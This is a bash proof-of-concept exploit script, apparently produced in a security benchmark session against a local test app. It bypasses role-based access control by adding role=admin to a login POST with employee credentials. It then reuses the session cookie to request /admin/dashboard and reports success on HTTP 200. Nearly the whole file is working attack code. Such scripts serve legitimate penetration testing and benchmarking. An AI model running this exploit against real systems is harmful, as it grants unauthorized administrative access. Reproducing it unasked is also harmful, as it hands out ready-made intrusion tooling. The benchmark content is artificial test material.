#!/bin/bash
# POC: Demonstrates RBAC bypass by manipulating role parameter in login endpoint to escalate employee privileges to admin
# Target: ./repo
# Created: 2025-12-01T15:46:27.884Z
# Session: benchmark-XBEN-089-24-minbd498

# RBAC Bypass via Role Parameter Manipulation POC
# This script demonstrates how an authenticated employee can escalate their privileges to admin
# by providing a role=admin parameter during login

TARGET_URL="${1:-http://localhost:5003}"
EMPLOYEE_USERNAME="emp1"
EMPLOYEE_PASSWORD="password1"

echo "=========================================="
echo "RBAC Bypass via Role Parameter Manipulation POC"
echo "=========================================="
echo ""
echo "Target: $TARGET_URL"
echo ""

# Step 1: Login as employee with role=admin parameter
echo "[*] Step 1: Attempting to login as employee ($EMPLOYEE_USERNAME) with role=admin parameter"
echo ""
echo "[*] Request: POST /login"
echo "    Data: username=$EMPLOYEE_USERNAME&password=$EMPLOYEE_PASSWORD&role=admin"
echo ""

LOGIN_RESPONSE=$(curl -s -c /tmp/cookies.txt -b /tmp/cookies.txt \
  -X POST \
  -d "username=$EMPLOYEE_USERNAME&password=$EMPLOYEE_PASSWORD&role=admin" \
  "$TARGET_URL/login")

echo "[+] Response:"
echo "$LOGIN_RESPONSE"
echo ""

# Check if login was successful (look for success:true in response)
if echo "$LOGIN_RESPONSE" | grep -q "success.*true"; then
    echo "[+] Login successful! Server returned success=true"
    echo ""
    
    # Step 2: Verify session cookie was created
    echo "[*] Step 2: Checking session cookie"
    if [ -f /tmp/cookies.txt ]; then
        echo "[+] Session cookie file created"
        cat /tmp/cookies.txt | grep -v "^#"
    fi
    echo ""
    
    # Step 3: Access admin dashboard with the session cookie
    echo "[*] Step 3: Attempting to access /admin/dashboard with escalated session"
    echo ""
    echo "[*] Request: GET /admin/dashboard"
    echo ""
    
    DASHBOARD_RESPONSE=$(curl -s -w "\nHTTP_CODE:%{http_code}" -b /tmp/cookies.txt \
      -X GET \
      "$TARGET_URL/admin/dashboard")
    
    # Extract HTTP code
    HTTP_CODE=$(echo "$DASHBOARD_RESPONSE" | grep "HTTP_CODE:" | cut -d: -f2)
    BODY=$(echo "$DASHBOARD_RESPONSE" | sed '/HTTP_CODE:/d')
    
    echo "[+] HTTP Response Code: $HTTP_CODE"
    echo "[+] Response body (first 500 chars):"
    echo "$BODY" | head -c 500
    echo ""
    echo ""
    
    # Check if we got 200 OK
    if [ "$HTTP_CODE" = "200" ]; then
        echo "[+] SUCCESS: Received HTTP 200 from admin dashboard!"
        echo "[+] VULNERABILITY CONFIRMED: Employee successfully escalated to admin role"
        echo "[+] This demonstrates complete RBAC bypass via role parameter manipulation"
        rm -f /tmp/cookies.txt
        exit 0
    else
        echo "[-] Unexpected HTTP code: $HTTP_CODE"
        rm -f /tmp/cookies.txt
        exit 1
    fi
else
    echo "[-] Login response did not contain success:true"
    echo "[-] Full response:"
    echo "$LOGIN_RESPONSE"
    rm -f /tmp/cookies.txt
    exit 1
fi